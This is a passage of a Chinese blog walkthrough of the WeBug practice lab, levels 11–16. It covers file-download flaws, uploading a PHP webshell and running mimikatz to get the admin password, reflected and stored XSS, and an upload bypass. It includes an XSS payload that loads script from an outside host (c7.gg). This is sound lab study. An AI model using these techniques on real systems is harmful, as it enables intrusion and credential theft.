+<p><img src="https://ws1.sinaimg.cn/large/0078beR7ly1fz4a7b93lfj30ii0bxmxm.jpg" alt="image"></p>
+<h2 id="第11关-POST类型任意下载漏洞"><a href="#第11关-POST类型任意下载漏洞" class="headerlink" title="第11关:POST类型任意下载漏洞"></a>第11关:POST类型任意下载漏洞</h2><p>第10关是通过GET请求下载文件,第11关是通过POST请求下载文件,直接修改变量pic的值为config.php文件的路径即可<br><img src="https://ws1.sinaimg.cn/large/0078beR7ly1fz4a8l5gvaj30yc0kpwn9.jpg" alt="image"></p>
+<h2 id="第12关-D盘找密码"><a href="#第12关-D盘找密码" class="headerlink" title="第12关:D盘找密码"></a>第12关:D盘找密码</h2><p>上传个PHP木马,确定其上传路径<br><img src="https://wx3.sinaimg.cn/large/0078beR7ly1fz4a91khr1j312e0aqq34.jpg" alt="image"><br>直接传一句话木马，上传上去后，然后在菜刀中上传mimikatz<br><img src="https://wx3.sinaimg.cn/large/0078beR7ly1fz4aagdhbsj309501e0h3.jpg" alt="image"><br>得到系统管理员登录密码为123456~<br><img src="https://ws1.sinaimg.cn/large/0078beR7ly1fz4aakp6f3j30gc078dfu.jpg" alt="image"></p>
+<h2 id="第13关-反射型XSS"><a href="#第13关-反射型XSS" class="headerlink" title="第13关:反射型XSS"></a>第13关:反射型XSS</h2><p>构造payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.239.131/pentest/test/9/?id=&lt;script src=http://c7.gg/bSTkf&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://ws2.sinaimg.cn/large/0078beR7ly1fz4ab6can0j315x09v3zc.jpg" alt="image"></p>
+<h2 id="第14关-存储型XSS"><a href="#第14关-存储型XSS" class="headerlink" title="第14关:存储型XSS"></a>第14关:存储型XSS</h2><p>构造payload:<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(/xss/)&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://wx1.sinaimg.cn/large/0078beR7ly1fz4ac4vqdej30g907zgmf.jpg" alt="image"></p>
+<h2 id="第15题-上传漏洞"><a href="#第15题-上传漏洞" class="headerlink" title="第15题:上传漏洞"></a>第15题:上传漏洞</h2><p>制作一个图片马,上传,burp修改文件名为php即可成功上传<br><img src="https://ws1.sinaimg.cn/large/0078beR7ly1fz4acrxrf5j30xh0id0vu.jpg" alt="image"><br>成功解析<br><img src="https://ws4.sinaimg.cn/large/0078beR7ly1fz4ad73mnbj31gz0h8q9h.jpg" alt="image"><br>菜刀连接<br><img src="https://wx4.sinaimg.cn/large/0078beR7ly1fz4adj84dfj30wz0c50ud.jpg" alt="image"></p>
+<h2 id="第16题-明天双十一-我从公司网络去剁手了！"><a href="#第16题-明天双十一-我从公司网络去剁手了！" class="headerlink" title="第16题:明天双十一 我从公司网络去剁手了！"></a>第16题:明天双十一 我从公司网络去剁手了！</h2><p>折腾了一会没找到答案,查看源码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">if(strstr($url,&quot;www.taobao.com&quot;))&#123;</span><br><span class="line">		if($_SERVER[&apos;HTTP_HOST&apos;]==&quot;10.10.10.10&quot;)&#123;</span><br><span class="line">		if(strstr($_SERVER[&apos;HTTP_REFERER&apos;],&quot;www.baidu.com&quot;))&#123;</span><br><span class="line">		if(strstr($_SERVER[&apos;HTTP_REFERER&apos;],&quot;www.baidu.com&quot;))&#123;</span><br><span class="line">		echo &quot;剁手了，请记录截图!!!flag:83242lkjKJ(*&amp;*^*&amp;k0&quot;.&quot;&lt;br/&gt;&quot;;</span><br><span class="line">	&#125;else&#123;</span><br><span class="line">		echo &quot;不想剁手了&quot;.&quot;&lt;br/&gt;&quot;;</span><br><span class="line">	&#125;</span><br><span class="line">	&#125;else&#123;</span><br><span class="line">		echo &quot;nono&quot;.&quot;&lt;br/&gt;&quot;;</span><br><span class="line">	&#125;</span><br><span class="line">	&#125;else&#123;</span><br><span class="line">		echo &quot;哎呀，这里只允许10.10.10.10访问！！！&quot;.&quot;&lt;br/&gt;&quot;;</span><br><span class="line">	&#125;</span><br><span class="line">	&#125;else&#123;</span><br><span class="line">		echo &quot;这个地方剁手不好，换个地方！&quot;;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
+<p>发现必须要满足三个条件才可以获得flag<br>1.请求参数url=<a href="http://www.taobao.com" target="_blank" rel="noopener">www.taobao.com</a><br>2.referer为<a href="http://www.baidu.com" target="_blank" rel="noopener">www.baidu.com</a><br>3.HOST值为10.10.10.10<br><img src="https://ws3.sinaimg.cn/large/0078beR7ly1fz4agqahytj30xu0dj0u1.jpg" alt="image"></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+	
+	    <div>
+     
+     <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
+    
+</div>
+        </div>
+	
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/靶机实验/" rel="tag"><i class="fa fa-tag"></i> 靶机实验</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/02/19/ms17-010/" rel="next" title="与永恒之蓝的一场旅行">
+                <i class="fa fa-chevron-left"></i> 与永恒之蓝的一场旅行
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="https://i.loli.net/2018/10/22/5bcd762c46c2c.jpg" alt="Louisnie">
+            
+              <p class="site-author-name" itemprop="name">Louisnie</p>
+              <p class="site-description motion-element" itemprop="description">Attitude determines Altitude!</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">11</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">4</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">5</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+			  
+            </div>
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/Louisnie/louisnie.github.io" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://mail.google.com/mail/u/0/?zx=gg4mjbu7kr29#inbox" target="_blank" title="Gmail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>Gmail</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://blog.csdn.net/qq_39353923" target="_blank" title="CSDN">
+                      
+                        <i class="fa fa-fw fa-books"></i>CSDN</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://music.163.com/" target="_blank" title="网易云音乐">
+                      
+                        <i class="fa fa-fw fa-music"></i>网易云音乐</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+                <div class="links-of-blogroll-title">
+                   <i class="fa  fa-fw fa-link"></i>
+                   友情链接&nbsp;
+                   <i class="fa  fa-fw fa-link"></i>
+            </div>
+            <ul class="links-of-blogroll-list">
+               
+                  <li class="links-of-blogroll-item">
+                     <a href="https://www.google.com.hk   || google" title="Google" target="_blank">Google</a>
+                   </li>
+               
+                  <li class="links-of-blogroll-item">
+                     <a href="https://github.com/   || github" title="Github" target="_blank">Github</a>
+                   </li>
+               
+                  <li class="links-of-blogroll-item">
+                     <a href="https://thief.one/" title="nMask" target="_blank">nMask</a>
+                   </li>
+               
+                  <li class="links-of-blogroll-item">
+                     <a href="http://www.lmxspace.com/" title="l1nk3r" target="_blank">l1nk3r</a>
+                   </li>
+               
+            </ul>
+             <div id="days"></div>
+
+<script language="javascript">
+function show_date_time(){
+window.setTimeout("show_date_time()", 1000);
+BirthDay=new Date("10/20/2018 12:00:00");
+today=new Date();
+timeold=(today.getTime()-BirthDay.getTime());
+sectimeold=timeold/1000
+secondsold=Math.floor(sectimeold);
+msPerDay=24*60*60*1000
+e_daysold=timeold/msPerDay
+daysold=Math.floor(e_daysold);
+e_hrsold=(e_daysold-daysold)*24;
+hrsold=setzero(Math.floor(e_hrsold));
+e_minsold=(e_hrsold-hrsold)*60;
+minsold=setzero(Math.floor((e_hrsold-hrsold)*60));
+seconds=setzero(Math.floor((e_minsold-minsold)*60));
+document.getElementById('days').innerHTML="已运行"+daysold+"天"+hrsold+"时"+minsold+"分"+seconds+"秒";
+}
+function setzero(i){
+if (i<10)
+{i="0" + i};
+return i;
+}
+show_date_time();
+</script>
+
+      </div>
+     
+		<div id="music163player">
+           <<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=5181411&auto=0&height=66">
+           </iframe>
+        </div>">
+           
+
+        
+
+          <div id="days"></div>
+
+<script language="javascript">
+function show_date_time(){
+window.setTimeout("show_date_time()", 1000);
+BirthDay=new Date("10/20/2018 12:00:00");
+today=new Date();
+timeold=(today.getTime()-BirthDay.getTime());
+sectimeold=timeold/1000
+secondsold=Math.floor(sectimeold);
+msPerDay=24*60*60*1000
+e_daysold=timeold/msPerDay
+daysold=Math.floor(e_daysold);
+e_hrsold=(e_daysold-daysold)*24;
+hrsold=setzero(Math.floor(e_hrsold));
+e_minsold=(e_hrsold-hrsold)*60;
+minsold=setzero(Math.floor((e_hrsold-hrsold)*60));
+seconds=setzero(Math.floor((e_minsold-minsold)*60));
+document.getElementById('days').innerHTML="已运行"+daysold+"天"+hrsold+"时"+minsold+"分"+seconds+"秒";
+}
+function setzero(i){
+if (i<10)
+{i="0" + i};
+return i;
+}
+show_date_time();
+</script>
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#weBug环境介绍"><span class="nav-number">1.</span> <span class="nav-text">weBug环境介绍:</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#WeBug安装使用"><span class="nav-number">2.</span> <span class="nav-text">WeBug安装使用:</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#WeBug包含的漏洞"><span class="nav-number">3.</span> <span class="nav-text">WeBug包含的漏洞:</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#第一关-普通的GET注入"><span class="nav-number">4.</span> <span class="nav-text">第一关:普通的GET注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#第二关-从图中你能找到什么"><span class="nav-number">5.</span> <span class="nav-text">第二关: 从图中你能找到什么?</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#第三关-你看到了什么"><span class="nav-number">6.</span> <span class="nav-text">第三关:你看到了什么?</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#第四关-告诉你了FLAG是5位数"><span class="nav-number">7.</span> <span class="nav-text">第四关:告诉你了FLAG是5位数</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#第五关-一个优点小小的特殊的注入"><span class="nav-number">8.</span> <span class="nav-text">第五关:一个优点小小的特殊的注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#第六关-支付漏洞"><span class="nav-number">9.</span> <span class="nav-text">第六关:支付漏洞</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#第七关-越权问题"><span class="nav-number">10.</span> <span class="nav-text">第七关:越权问题</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#第八关-CSRF"><span class="nav-number">11.</span> <span class="nav-text">第八关:CSRF</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#第九关-URL跳转"><span class="nav-number">12.</span> <span class="nav-text">第九关:URL跳转</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#第十关-GET类型任意下载漏洞"><span class="nav-number">13.</span> <span class="nav-text">第十关:GET类型任意下载漏洞</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#第11关-POST类型任意下载漏洞"><span class="nav-number">14.</span> <span class="nav-text">第11关:POST类型任意下载漏洞</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#第12关-D盘找密码"><span class="nav-number">15.</span> <span class="nav-text">第12关:D盘找密码</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#第13关-反射型XSS"><span class="nav-number">16.</span> <span class="nav-text">第13关:反射型XSS</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#第14关-存储型XSS"><span class="nav-number">17.</span> <span class="nav-text">第14关:存储型XSS</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#第15题-上传漏洞"><span class="nav-number">18.</span> <span class="nav-text">第15题:上传漏洞</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#第16题-明天双十一-我从公司网络去剁手了！"><span class="nav-number">19.</span> <span class="nav-text">第16题:明天双十一 我从公司网络去剁手了！</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; 2018 &mdash; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Louisnie</span>
+
+  
+</div>
+
+
+<!--  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>
+
+
+
+<div class="theme-info">
+  <div class="powered-by"></div>
+-->
+  <span class="post-count">博客全站共19.2k字</span>
+</div>
+
+        
+
+
+
+
+
+
+
+        
+      </footer></div>
+    
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+          <span id="scrollpercent"><span>0</span>%</span>
+        
+      </div>
+    
+
+    
+
+  
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+  
+<script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"scale":1,"jsonPath":"/live2dw/assets/wanko.model.json"},"display":{"superSample":2,"width":150,"height":150,"position":"left"},"mobile":{"show":true},"react":{"opacityDefault":0.9,"opacityOnHover":0.5},"log":false});</script></body>
+</html>
+
+<!-- 页面点击小红心 -->
+<script type="text/javascript" src="/js/src/clicklove.js"></script>
+
+#next主题标签也随机颜色
+<script type="text/javascript">
+var languages = new Array("C","C++","Java","C#","Python","HTML","CSS","JavaScript","SQL");
+var randoms = new Array(4,3,2,1,3,2,1,4,2,1,3,4,1,2,3,4);
+$(document).ready(function(){
+var tags_all = $(".tag-cloud-tags a");
+tags_all.each(function(){
+  var x = parseInt(Math.random()*3);
+  if(x > 0){
+    x = 1;
+  }
+  for(var i = 0;i<languages.length;i++){
+    if($(this).text() == languages[i]){
+        x = 2;
+      break;
+    }
+  }
+  var y =0;
+  if(x != 0){
+    y = parseInt(Math.random()*16);
+    y = randoms[y];
+  }
+  $(this).addClass("tags"+x+y);
+});
+});
+</script>
